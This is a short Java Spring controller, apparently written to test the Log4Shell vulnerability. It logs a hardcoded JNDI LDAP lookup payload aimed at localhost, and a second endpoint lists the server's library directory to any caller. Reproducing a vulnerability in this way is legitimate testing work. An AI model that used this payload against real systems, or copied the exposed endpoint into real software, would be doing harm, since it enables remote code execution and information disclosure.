package cn.leon.testlog4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.Resource;
import javax.servlet.ServletContext;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

@RestController
public class TestLog4jController {
    private static final Logger logger= LogManager.getLogger();

    @GetMapping
    public void test() {
        String input="${jndi:ldap://localhost:1099/RmiExecute}";
        logger.error("input,{}",input);
    }
    @Resource
    private ServletContext servletContext;

    @GetMapping("dependencies")
    public List<String> dependencies(){
        String realPath = servletContext.getRealPath("/WEB-INF/lib/");
        return new ArrayList(){{
            add(new File(realPath).list());
        }};
    }
}
